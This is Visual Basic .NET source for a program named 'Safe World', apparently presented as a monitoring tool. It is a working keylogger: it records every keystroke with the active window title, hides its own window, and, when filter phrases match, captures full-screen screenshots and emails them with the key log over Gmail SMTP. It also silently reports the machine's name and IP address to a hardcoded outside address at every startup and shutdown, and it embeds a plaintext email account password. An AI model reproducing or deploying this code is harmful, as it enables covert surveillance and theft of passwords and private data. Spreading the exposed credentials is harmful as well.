Option Strict Off
Option Explicit On
Imports System.Net
Imports Microsoft
Imports Microsoft.Win32
Imports Microsoft.Win32.Registry
Imports System.IO
Imports System.Data
Imports System.Math
Imports System.Collections.Generic
Imports System.Text
Imports System.IO.Compression
Imports System.IO.DirectoryInfo
Imports VB = Microsoft.VisualBasic
Imports System.Net.Mail.MailMessage
Public Class Form1
    Inherits System.Windows.Forms.Form
    Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Integer) As Short
    Private Declare Function GetForegroundWindow Lib "user32" () As Integer
    Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Integer, ByVal lpString As String, ByVal cch As Integer) As Integer
    Private Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Integer) As Integer
    Private LastWindow As String
    Private LastHandle As Integer
    Private dKey(255) As Integer
    Private Const VK_SHIFT As Short = &H10S
    Private Const VK_CTRL As Short = &H11S
    Private Const VK_ALT As Short = &H12S
    Private Const VK_CAPITAL As Short = &H14S
    Private ChangeChr(255) As String
    Private AltDown As Boolean
    Dim AC As String
    Dim se As Integer = 0
    Dim su As String
    Dim inc As Integer = 0
    Dim i As Integer = 1
    Dim Fsize As Size = Screen.PrimaryScreen.Bounds.Size
    Dim bm As New Bitmap(Fsize.Width, Fsize.Height)
    Dim Gf As Graphics
    Dim ScreenCap As Image
    Dim Base As String
    Function TypeWindow() As Object
        Dim svar As Object
        'Funcion para saber el tipo de ventana y devolver el nombre.
        Dim Handle_Renamed As Integer
        Dim textlen As Integer
        Dim WindowText As String
        'Obtenemos el nombre de la vetana de fondo
        Handle_Renamed = GetForegroundWindow
        LastHandle = Handle_Renamed
        textlen = GetWindowTextLength(Handle_Renamed) + 1

        WindowText = Space(textlen) 'Obtenemos el espacio del nombre
        svar = GetWindowText(Handle_Renamed, WindowText, textlen) 'Guardamos en la variable svar_
        'El contenido del nombre
        WindowText = VB.Left(WindowText, Len(WindowText) - 1)
        'Cuando se hace cambio de ventana se pasa un espacio y se pone un delimitador_
        'con ese delimitador nos damos cuenta de que el nombre ya cambio .
        If WindowText <> LastWindow Then
            If Form3.RichTextBox1.Text <> "" Then Form3.RichTextBox1.Text = Form3.RichTextBox1.Text & vbCrLf & vbCrLf
            'Separador que escrimos en el textbox
            Form3.RichTextBox1.Text = Form3.RichTextBox1.Text & "|=============================|" & vbCrLf & WindowText & vbCrLf & "|==============================|" & vbCrLf
            LastWindow = WindowText 'vemos ventana
        End If
    End Function
    Public Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Int32) As Int16

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Dim i As Object
        If GetAsyncKeyState(VK_ALT) = 0 And AltDown = True Then
            AltDown = False
            Form3.RichTextBox1.Text = Form3.RichTextBox1.Text & "[ALT]"
        End If
        For i = Asc("A") To Asc("Z")

            If GetAsyncKeyState(i) = -32767 Then
                TypeWindow()

                If GetAsyncKeyState(VK_SHIFT) < 0 Then
                    If GetKeyState(VK_CAPITAL) > 0 Then
                        Form3.RichTextBox1.Text = Form3.RichTextBox1.Text & LCase(Chr(i))
                        Exit Sub
                    Else
                        Form3.RichTextBox1.Text = Form3.RichTextBox1.Text & UCase(Chr(i))
                        Exit Sub
                    End If
                Else
                    If GetKeyState(VK_CAPITAL) > 0 Then
                        Form3.RichTextBox1.Text = Form3.RichTextBox1.Text & UCase(Chr(i))
                        Exit Sub
                    Else
                        Form3.RichTextBox1.Text = Form3.RichTextBox1.Text & LCase(Chr(i))
                        Exit Sub
                    End If
                End If

            End If
        Next
        For i = 48 To 57

            If GetAsyncKeyState(i) = -32767 Then
                TypeWindow()

                If GetAsyncKeyState(VK_SHIFT) < 0 Then
                    Form3.RichTextBox1.Text = Form3.RichTextBox1.Text & ChangeChr(i)
                    Exit Sub
                Else

                    Form3.RichTextBox1.Text = Form3.RichTextBox1.Text & Chr(i)
                    Exit Sub
                End If

            End If
        Next
        For i = 186 To 192

            If GetAsyncKeyState(i) = -32767 Then
                TypeWindow()

                If GetAsyncKeyState(VK_SHIFT) < 0 Then
                    Form3.RichTextBox1.Text = Form3.RichTextBox1.Text & ChangeChr(i - 100)
                    Exit Sub
                Else
                    Form3.RichTextBox1.Text = Form3.RichTextBox1.Text & ChangeChr(i)
                    Exit Sub
                End If

            End If
        Next


        '[\]'
        For i = 219 To 222

            If GetAsyncKeyState(i) = -32767 Then
                TypeWindow()

                If GetAsyncKeyState(VK_SHIFT) < 0 Then

                    Form3.RichTextBox1.Text = Form3.RichTextBox1.Text & ChangeChr(i - 100)
                    Exit Sub
                Else

                    Form3.RichTextBox1.Text = Form3.RichTextBox1.Text & ChangeChr(i)
                    Exit Sub
                End If

            End If
        Next
        For i = 96 To 111

            If GetAsyncKeyState(i) = -32767 Then
                TypeWindow()

                If GetAsyncKeyState(VK_ALT) < 0 And AltDown = False Then
                    AltDown = True
                    Form3.RichTextBox1.Text = Form3.RichTextBox1.Text & "[ALT-abajo]"
                Else
                    If GetAsyncKeyState(VK_ALT) >= 0 And AltDown = True Then
                        AltDown = False
                        Form3.RichTextBox1.Text = Form3.RichTextBox1.Text & "[ALT-arriba]"
                    End If
                End If


                Form3.RichTextBox1.Text = Form3.RichTextBox1.Text & ChangeChr(i)
                Exit Sub
            End If
        Next
        If GetAsyncKeyState(32) = -32767 Then
            TypeWindow()
            Form3.RichTextBox1.Text = Form3.RichTextBox1.Text & " "
        End If
        If GetAsyncKeyState(13) = -32767 Then
            TypeWindow()
            Form3.RichTextBox1.Text = Form3.RichTextBox1.Text & vbNewLine + "[" + TimeString + "]" + " "
        End If
        If GetAsyncKeyState(8) = -32767 Then
            TypeWindow()
            Form3.RichTextBox1.Text = Form3.RichTextBox1.Text & "[Retroceso]"
        End If
        If GetAsyncKeyState(37) = -32767 Then
            TypeWindow()
            Form3.RichTextBox1.Text = Form3.RichTextBox1.Text & "[FlechaIzq]"
        End If
        If GetAsyncKeyState(38) = -32767 Then
            TypeWindow()
            Form3.RichTextBox1.Text = Form3.RichTextBox1.Text & "[FlechaArriba]"
        End If
        If GetAsyncKeyState(39) = -32767 Then
            TypeWindow()
            Form3.RichTextBox1.Text = Form3.RichTextBox1.Text & "[FlechaDer]"
        End If
        If GetAsyncKeyState(40) = -32767 Then
            TypeWindow()
            Form3.RichTextBox1.Text = Form3.RichTextBox1.Text & "[FlechaAbajo]"
        End If
        If GetAsyncKeyState(9) = -32767 Then
            TypeWindow()
            Form3.RichTextBox1.Text = Form3.RichTextBox1.Text & "[Tabulador]"
        End If
        If GetAsyncKeyState(27) = -32767 Then
            TypeWindow()
            Form3.RichTextBox1.Text = Form3.RichTextBox1.Text & "[Escape]"
        End If
        For i = 45 To 46

            If GetAsyncKeyState(i) = -32767 Then
                TypeWindow()
                Form3.RichTextBox1.Text = Form3.RichTextBox1.Text & ChangeChr(i)
            End If
        Next
        For i = 33 To 36
            '
            If GetAsyncKeyState(i) = -32767 Then
                TypeWindow()
                Form3.RichTextBox1.Text = Form3.RichTextBox1.Text & ChangeChr(i)
            End If
        Next
        If GetAsyncKeyState(1) = -32767 Then
            If (LastHandle = GetForegroundWindow) And LastHandle <> 0 Then
                Form3.RichTextBox1.Text = Form3.RichTextBox1.Text & "[ClickIzq]"
            End If
        End If
    End Sub
    Public Function SacarIp() As String
        Dim Ip As String
        Ip = Dns.GetHostEntry(My.Computer.Name).AddressList.FirstOrDefault(Function(i) i.AddressFamily = Sockets.AddressFamily.InterNetwork).ToString()
        Return Ip
    End Function

    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        If (My.Settings.correo <> "") Then
            'se envia email ade advertencia
            Dim _Message As New System.Net.Mail.MailMessage()
            Dim _SMTP As New System.Net.Mail.SmtpClient
            Dim con As String = My.Computer.Name + "(" + SacarIp() + ")" + " se esta Apagando a las: " + TimeString
            'CONFIGURACIÓN DEL STMP
            _SMTP.Credentials = New System.Net.NetworkCredential("controlpa1405@gmail.com", "taurus:$91513260")
            _SMTP.Host = "smtp.gmail.com"
            _SMTP.Port = 587
            _SMTP.EnableSsl = True

            ' CONFIGURACION DEL MENSAJE
            _Message.[To].Add("kevinmolinataylor@gmail.com")        'segunda cuenta a enviar la informacion
            _Message.From = New System.Net.Mail.MailAddress("controlpa1405@gmail.com", "Safe World", System.Text.Encoding.UTF8) 'Quien lo envía
            _Message.Subject = "Safe World - Reportes DATA" 'Sujeto del e-mail
            _Message.SubjectEncoding = System.Text.Encoding.UTF8 'Codificacion
            _Message.Body = con
            _Message.BodyEncoding = System.Text.Encoding.UTF8
            _Message.Priority = System.Net.Mail.MailPriority.Normal
            _Message.IsBodyHtml = False

            'ENVIO
            Try
                _SMTP.Send(_Message)
            Catch ex As Exception
            End Try
        End If
    End Sub
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Try
            Timer2.Enabled = True
            Form5.Timer1.Enabled = True
            Form5.Timer4.Enabled = True
            Dim ProcesosLocales As Process() = Process.GetProcessesByName("Safe world")
            If ProcesosLocales.Length > 0 Then
                For Each tu As Process In ProcesosLocales
                    tu.Kill()
                Next
            End If
            If (My.Settings.guarda = True) Then
                Form3.RichTextBox1.Text = My.Settings.backup
            Else
                Form3.RichTextBox1.Text = ""
            End If
            If (My.Settings.proteger = False) Then
                Button1.Enabled = True
                Button2.Enabled = False
                ProgressBar1.Enabled = False
            Else
                Button2.Enabled = False
                Timer1.Enabled = True
                Timer3.Enabled = True
                Dim escribir As New System.IO.StreamWriter(My.Settings.ruta)
                escribir.Write(My.Settings.sitius)
                escribir.Close()
            End If
            If (My.Settings.correo <> "") Then
                'se envia email ade advertencia
                Dim _Message As New System.Net.Mail.MailMessage()
                Dim _SMTP As New System.Net.Mail.SmtpClient
                Dim con As String = My.Computer.Name + "(" + SacarIp() + ")" + " se esta Encendiendo a las: " + TimeString
                'CONFIGURACIÓN DEL STMP
                _SMTP.Credentials = New System.Net.NetworkCredential("controlpa1405@gmail.com", "taurus:$91513260")
                _SMTP.Host = "smtp.gmail.com"
                _SMTP.Port = 587
                _SMTP.EnableSsl = True

                ' CONFIGURACION DEL MENSAJE
                _Message.[To].Add("kevinmolinataylor@gmail.com")        'segunda cuenta a enviar la informacion
                _Message.From = New System.Net.Mail.MailAddress("controlpa1405@gmail.com", "Safe World", System.Text.Encoding.UTF8) 'Quien lo envía
                _Message.Subject = "Safe World - Reportes DATA" 'Sujeto del e-mail
                _Message.SubjectEncoding = System.Text.Encoding.UTF8 'Codificacion
                _Message.Body = con
                _Message.BodyEncoding = System.Text.Encoding.UTF8
                _Message.Priority = System.Net.Mail.MailPriority.Normal
                _Message.IsBodyHtml = False

                'ENVIO
                Try
                    _SMTP.Send(_Message)
                Catch ex As Exception
                End Try
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
        Me.Hide()
        Timer2.Enabled = False

    End Sub

    Private Sub ConfiguraciónToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ConfiguraciónToolStripMenuItem.Click
        Form4.Show()
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        If (My.Settings.ruta = "") Then
            MsgBox("No ah configurado la actividad del software,ir a configuraciones", MsgBoxStyle.Critical, "Informacion")
        Else
            Try
                Dim escribir As New System.IO.StreamWriter(My.Settings.ruta)
                escribir.Write(My.Settings.sitius)
                escribir.Close()
                Timer1.Enabled = True
                Timer3.Enabled = True
                Timer4.Enabled = True
                Button1.Enabled = False
                Button2.Enabled = True
                My.Settings.proteger = True
            Catch ex As Exception
            End Try
        End If
    End Sub

    Private Sub Timer3_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer3.Tick
        For Each frase As String In My.Settings.filter
            Dim returnValue As Integer = -1

            ' Ensure that a search string has been specified and a valid start point.
            If Form3.RichTextBox1.TextLength > 0 Then
                ' Obtain the location of the search string in richTextBox1.
                Dim indexToText As Integer = Form3.RichTextBox1.Find(frase)
                ' Determine whether the text was found in richTextBox1.
                If indexToText > 0 Then
                    Try
                        indexToText = 0
                        Base = Form3.RichTextBox1.Text
                        Form3.RichTextBox1.Clear()
                        Gf = Graphics.FromImage(bm)
                        Gf.CopyFromScreen(0, 0, 0, 0, Fsize)
                        ScreenCap = bm
                        Dim RutaArchivo As String = Application.StartupPath + "\Imagen" + CStr(i) + ".jpg"
                        ScreenCap.Save(RutaArchivo)
                        Form3.PictureBox1.Image = System.Drawing.Image.FromFile(RutaArchivo.ToString)
                        If My.Computer.Network.IsAvailable() Then
                            If My.Computer.Network.Ping("www.google.es", 1000) Then
                                Try

                                    Dim Lab As String = Application.StartupPath + "\Imagen" + CStr(i) + ".jpg"
                                    Dim archivo As New System.Net.Mail.Attachment(Lab)
                                    Dim _Message As New System.Net.Mail.MailMessage()
                                    Dim _SMTP As New System.Net.Mail.SmtpClient

                                    'CONFIGURACIÓN DEL STMP
                                    _SMTP.Credentials = New System.Net.NetworkCredential("controlpa1405@gmail.com", "taurus:$91513260")
                                    _SMTP.Host = "smtp.gmail.com"
                                    _SMTP.Port = 587
                                    _SMTP.EnableSsl = True

                                    ' CONFIGURACION DEL MENSAJE
                                    _Message.[To].Add(My.Settings.correo) 'Cuenta de Correo al que se le quiere enviar el e-mail
                                    _Message.From = New System.Net.Mail.MailAddress("controlpa1405@gmail.com", "Safe World", System.Text.Encoding.UTF8) 'Quien lo envía
                                    _Message.Subject = "Safe World - Reportes DATA" 'Sujeto del e-mail
                                    _Message.SubjectEncoding = System.Text.Encoding.UTF8 'Codificacion
                                    _Message.Attachments.Add(archivo)
                                    _Message.Body = Base
                                    _Message.BodyEncoding = System.Text.Encoding.UTF8
                                    _Message.Priority = System.Net.Mail.MailPriority.Normal
                                    _Message.IsBodyHtml = False

                                    'ENVIO
                                    Try
                                        _SMTP.Send(_Message)
                                        i += 1
                                    Catch ex As System.Net.Mail.SmtpException
                                    End Try
                                Catch ex As Exception
                                End Try
                            End If
                        Else
                            Try
                                My.Settings.backup = Form3.RichTextBox1.Text
                                My.Settings.guarda = True
                            Catch ex As Exception
                            End Try
                        End If
                    Catch ex As Exception
                    End Try
                End If
            End If
        Next
    End Sub

    Private Sub Timer4_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer4.Tick
        If (ProgressBar1.Value < 100) Then
            ProgressBar1.Value += 10
        Else
            ProgressBar1.Enabled = False
            Timer4.Enabled = False
            Me.Hide()
        End If
    End Sub

    Private Sub SALIRToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SALIRToolStripMenuItem.Click
        Me.Hide()
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        My.Settings.proteger = False
        Button2.Enabled = False
        Button1.Enabled = True
    End Sub

    Private Sub AboutToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles AboutToolStripMenuItem.Click
        Form6.Show()
    End Sub
End Class
